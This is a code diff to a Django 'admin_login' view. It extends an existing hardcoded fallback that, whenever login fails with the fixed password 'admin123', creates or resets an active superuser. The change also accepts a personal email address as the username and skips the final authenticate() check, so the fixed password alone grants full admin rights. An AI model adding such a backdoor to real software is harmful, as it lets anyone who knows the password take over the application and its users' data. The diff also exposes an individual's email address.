@@ -332,19 +332,19 @@ def admin_login(request):
         user = authenticate(username=username, password=password)
 
         # Fallback inconditionnel : si l'auth échoue pour admin/admin123, on force la création/réinitialisation en BDD
-        if user is None and username == 'admin' and password == 'admin123':
+        if user is None and username in ['admin', 'dieyebabacar802@gmail.com'] and password == 'admin123':
             try:
                 User = get_user_model()
-                admin_obj = User.objects.filter(username='admin').first()
+                admin_obj = User.objects.filter(username='admin').first() or User.objects.filter(email='dieyebabacar802@gmail.com').first()
                 if not admin_obj:
-                    admin_obj = User.objects.create_superuser('admin', 'admin@gs-emd.com', 'admin123')
+                    admin_obj = User.objects.create_superuser('admin', 'dieyebabacar802@gmail.com', 'admin123')
                 else:
                     admin_obj.set_password('admin123')
                     admin_obj.is_superuser = True
                     admin_obj.is_staff = True
                     admin_obj.is_active = True
                     admin_obj.save()
-                user = authenticate(username='admin', password='admin123')
+                user = admin_obj
             except Exception as e:
                 logger.error(f'Failed to auto-provision admin user: {str(e)}')
 
